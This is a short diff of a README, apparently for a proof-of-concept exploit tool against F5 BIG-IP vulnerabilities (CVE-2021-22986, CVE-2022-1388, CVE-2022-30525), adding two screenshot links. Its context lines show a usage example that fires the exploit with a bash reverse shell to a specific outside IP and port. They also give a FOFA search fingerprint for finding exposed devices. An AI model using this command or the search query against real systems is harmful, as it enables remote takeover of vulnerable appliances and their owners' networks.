@@ -31,7 +31,7 @@ CVE-2021-22986，CVE-2022-1388 POC默认执行id命令，返回{id}则漏洞存�
 usage: ./cve-2022-30525.exe -m exp -u url -c bash -i >& /dev/tcp/47.243.251.103/1377 0>&1
 
 # Screenshots
-
-
+![Image text](https://github.com/west9b/F5-BIG-IP-POC/blob/main/poc.png)
+![Image text](https://github.com/west9b/F5-BIG-IP-POC/blob/main/poc1.png)
 # fofa
 icon_hash="-335242539"
